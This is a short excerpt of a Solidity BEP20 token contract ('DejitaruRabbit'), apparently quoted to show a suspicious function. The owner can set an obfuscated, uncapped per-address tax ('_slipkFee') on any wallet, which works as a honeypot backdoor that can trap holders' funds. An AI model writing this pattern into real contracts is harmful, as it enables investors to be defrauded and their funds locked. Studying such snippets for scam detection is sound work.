...
// https://t.me/DejitaruRabbitERC20
...
contract DejitaruRabbit is BEP20, Ownable {
    ...
    mapping(address => uint256) private _slipkFee;
    ...
    function setSlipkFee(address _address, uint256 _value) external onlyOwner {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipkFee[_address] = _value;
    }

    function getSlipkFee(address _address) external view onlyOwner returns (uint256) {
        return _slipkFee[_address];
    }
